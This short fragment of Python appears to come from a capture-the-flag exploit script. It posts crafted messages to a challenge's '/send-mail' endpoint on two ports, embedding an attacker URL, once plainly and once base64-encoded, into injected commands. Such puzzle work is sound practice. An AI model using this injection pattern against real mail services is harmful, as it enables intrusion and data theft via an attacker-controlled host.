...
res = s.post(challenge_url %ports[0] + '/send-mail', data={'to': 'user@user.com', 'subject': 'familyfriendly', 'message': commands[0] %attacker_url })
...
res = s.post(challenge_url %ports[1] + '/send-mail', data={'to': 'user@user.com', 'subject': 'redacted', 'message': commands[1] %base64.b64encode(attacker_url.encode()).decode() })
